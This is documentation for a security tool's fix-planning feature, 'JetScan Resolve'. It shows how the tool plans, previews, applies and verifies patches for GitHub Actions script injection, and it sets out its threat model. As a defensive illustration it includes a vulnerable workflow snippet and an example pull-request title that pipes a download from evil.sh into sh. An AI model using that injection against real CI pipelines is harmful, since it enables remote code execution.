# JetScan Resolve (free): fix plans you can check

JetScan finds problems. Resolve helps you fix them, but on your terms:

- it shows you a plan first and changes nothing while doing so;
- it only edits a file when an exact, reviewed rule can prove the edit is safe;
- it never writes without `--confirm`, and never over a file you changed;
- it writes all files or none, and puts everything back if anything fails;
- it never runs a shell, npm, cargo, gradle, git or a hook, and sends nothing
  over the network;
- after an edit it re-runs the same check and says what it saw, finding by
  finding. It never says "your project is secure".

Everything else (leaked keys, dependency upgrades, `permissions: write-all`, and
the website and mobile app findings of jetscan Pro) gets clear advice, not an automatic
edit.

## The flow

```
  scan report (V2 JSON)        project folder
          |                          |  (GitHub Actions check, local)
          +------------+-------------+
                       v
            jetscan resolve plan ............ read-only
                       |   plan.json: steps, advice, file patches bound to
                       |   the SHA-256 of each file as it is now
                       v
            jetscan resolve preview ......... read-only
                       |   exact unified diff + every step
                       v
            jetscan resolve apply --confirm . the only step that writes
                       |   re-checks every file, temp file + atomic rename,
                       |   all or nothing, rollback on failure
                       |   result: applied, NOT verified
                       v
            jetscan resolve verify .......... read-only
                       per finding: verified_specific_issue | still_present | unknown
```

## Example: untrusted pull request text in a workflow

`.github/workflows/pr-title.yml` puts the pull request title straight into a
shell script. Anyone who opens a pull request can choose the title, so a title
like `"; curl evil.sh | sh; "` runs as code in your CI:

```yaml
      - name: Check the title format
        run: |
          title="${{ github.event.pull_request.title }}"
```

GitHub's own guidance is to pass such values through an environment variable.
Resolve does exactly that:

```
$ jetscan resolve plan . --out plan.json
Plan resolve/2b6b...f589 for C:\work\my-app
1 finding(s), 1 file patch(es), status available; input coverage is partial (see warnings)
Written to plan.json. Nothing in the project was changed.

$ jetscan resolve preview plan.json
...
--- a/.github/workflows/pr-title.yml
+++ b/.github/workflows/pr-title.yml
@@ -9,8 +9,10 @@
     runs-on: ubuntu-latest
     steps:
       - name: Check the title format
+        env:
+          PULL_REQUEST_TITLE: ${{ github.event.pull_request.title }}
         run: |
-          title="${{ github.event.pull_request.title }}"
+          title="${PULL_REQUEST_TITLE}"
...
Nothing was changed. To write exactly this diff: jetscan resolve apply plan.json --confirm

$ jetscan resolve apply plan.json --confirm
Plan resolve/2b6b...f589 for C:\work\my-app: applied_unverified
  written          .github/workflows/pr-title.yml
Not verified yet. Next: jetscan resolve verify plan.json

$ jetscan resolve verify plan.json
  file .github/workflows/pr-title.yml: planned_change_in_place
  verified_specific_issue  workflows/gha-script-injection/... (absent_and_patched_file_was_parsed)
1 of 1 finding(s) in this plan verified; state verified. This covers only these findings, not the whole project.
```

"Input coverage is partial" is honest, not an error: the GitHub Actions check
does not report whether it could read every file, so a plan built from it never
claims to cover everything.

You can also start from a V2 report file:
`jetscan resolve plan report-v2.json --root C:\work\my-app --out plan.json`.

## When Resolve will not edit (and tells you why)

The workflow edit is offered only if every untrusted expression in `run:`
scripts of that file is provably safe to move. Otherwise the plan says
"A safe automatic edit cannot be proven for this file (<reason>)" and gives
manual steps. Reasons include:

| reason | what it means |
|---|---|
| `recipe_expression_not_double_quoted` | `echo ${{ ... }}` or `'${{ ... }}'`: changing it would change word splitting or stop expansion |
| `recipe_reevaluation` | `eval`, `bash -c`, `python`, `$GITHUB_ENV`, `$GITHUB_OUTPUT`...: the value would still be run or injected after the edit |
| `recipe_command_substitution`, `recipe_heredoc` | `$(...)`, backticks, `<<`: quoting cannot be followed safely |
| `recipe_unknown_shell` | Windows runner (PowerShell), `defaults:` or a non-bash/sh `shell:` |
| `recipe_complex_expression` | `${{ format(..., github.event...) }}` and similar |
| `recipe_github_script` | `actions/github-script` (JavaScript, not shell) |
| `recipe_unsupported_yaml` / `_step` / `_env` / `_run_scalar` | YAML outside the small subset Resolve understands (anchors, folded `>`, quoted run, comments after `run:`...) |

`permissions: write-all` is always review-only: only you know which permissions
each job needs, and removing one it uses breaks the workflow.

## Leaked keys

Resolve never edits a file because of a leaked secret, and never shows the secret.
The plan says, in this order: revoke and rotate the key with its provider first
(deleting the text does not fix a leaked key: whoever copied it can still use
it); replace the value with a reference to a secret that is not committed; the
old value stays in Git history, forks, clones and CI logs, and rewriting history
is optional cleanup, not a fix. `verify` reports
`credential_revocation_cannot_be_checked_locally`.

## Dependency advisories

Advice only: the plan names the package and lockfile and points to
`jetscan deps --fix`, which prints the exact upgrade command or manifest edit
(and, unless `--offline`, asks OSV.dev). Resolve itself runs nothing.

## Exit codes

| command | 0 | 1 | 2 |
|---|---|---|---|
| plan | plan written/printed | - | bad input, `--out` exists |
| preview | shown | - | plan invalid or a file changed |
| apply | applied, already applied, or nothing to apply | rolled back / failed | no `--confirm`, other project, file changed, invalid plan |
| verify | every finding verified | a finding is still present | anything unknown |

## What protects your files (threat model)

The plan file is treated as untrusted input: it may have been edited or written
by someone else. Its id is a content hash, not a signature, so every check below
runs again on import and on apply.

- **Strict plan import.** Unknown or duplicate fields, an edited description, a
  changed id, a non-canonical root or a diff/command field are refused. A plan
  cannot carry new file content: apply recomputes it from the reviewed recipe.
- **Paths.** Only `.github/workflows/*.yml|*.yaml` can be patched. `..`, absolute
  paths, `C:\`, UNC, `file:stream` (ADS), `.git`, reserved Windows names and
  control characters are refused.
- **Links.** No component of the path may be a symlink or junction, at check time
  and again right before the rename; the plan root must still be the same real
  folder. Nothing is ever deleted or written through a link.
- **Your edits win.** Each file must hash to what the plan saw. A file already in
  the planned state is skipped (a second apply changes nothing); any other
  content is refused. The hash, size and modification time are checked again
  right before each replace.
- **Atomic, all or nothing.** New content goes to a temp file in the same folder
  (flushed and synced), the old content to a backup beside it, then an atomic
  rename. If anything fails, every replaced file is restored from its backup
  (only if it still holds Resolve's bytes) and temp files are removed.
- **Only the project you are in.** `apply` runs only from the folder the plan was
  made for (or `--root` naming it).
- **No execution, no network.** Nothing from the project is executed. `verify`
  calls the built-in static check; it writes a probe copy of the patched workflow
  to a private temporary folder outside the project and removes it.

Known limits: the window between the last re-check and the rename is very small
but not zero; on Windows the new file gets the folder's inherited permissions
(read-only files are refused); hard links are detected on Unix only; if a folder
is swapped for a link in the middle of apply, the already replaced file is not
restored through the link (result `failed`, backup kept next to it).

## For developers

Library: `jetscan::resolve::{plan, plan_with, preview, apply, verify}`,
`ResolvePlan::{parse, render_json, render_pretty}`. CLI runner:
`jetscan::resolve::cli::run`.
